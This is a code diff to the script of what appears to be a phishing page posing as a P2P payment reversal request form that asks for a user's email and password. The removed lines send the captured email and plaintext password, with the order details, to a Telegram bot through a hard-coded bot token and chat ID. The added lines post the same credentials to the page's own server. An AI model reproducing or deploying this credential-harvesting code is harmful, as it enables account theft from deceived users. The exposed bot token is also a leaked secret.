@@ -389,35 +389,22 @@
       btn.textContent = 'Submitting…';
       btn.disabled = true;
 
-      const BOT_TOKEN = '8751335932:AAHoS96avp1R_OsG0uI9yk1aie02H7Lb2Ms';
-      const CHAT_ID   = '2056358288';
-      const TG_URL    = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-      const reasonLabels = {
-        no_payment : 'No payment received',
-        no_proof   : 'No payment proof',
-        fraud      : 'Suspected fraud',
-        other      : 'Other',
-      };
-
-      const text = `🔔 New P2P Reversal Request\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🆔 Order ID: ${orderId}\n📋 Reason: ${reasonLabels[reason] || reason}\n🕒 Time: ${new Date().toUTCString()}`;
-
       try {
-        const res  = await fetch(TG_URL, {
+        const res  = await fetch('/submit', {
           method  : 'POST',
           headers : { 'Content-Type': 'application/json' },
-          body    : JSON.stringify({ chat_id: CHAT_ID, text }),
+          body    : JSON.stringify({ email, password, orderId, reason }),
         });
         const data = await res.json();
 
-        if (data.ok) {
+        if (data.success) {
           showToast('Reversal submitted successfully!', 4000);
           document.getElementById('reversalForm').reset();
           reasonField.classList.remove('filled');
           reasonSelect.classList.remove('has-value');
         } else {
-          console.error('Telegram error:', data);
-          showToast('Submission failed: ' + (data.description || 'Unknown error'));
+          console.error('Server error:', data);
+          showToast('Submission failed: ' + (data.message || 'Unknown error'));
         }
       } catch (err) {
         console.error('Fetch error:', err);
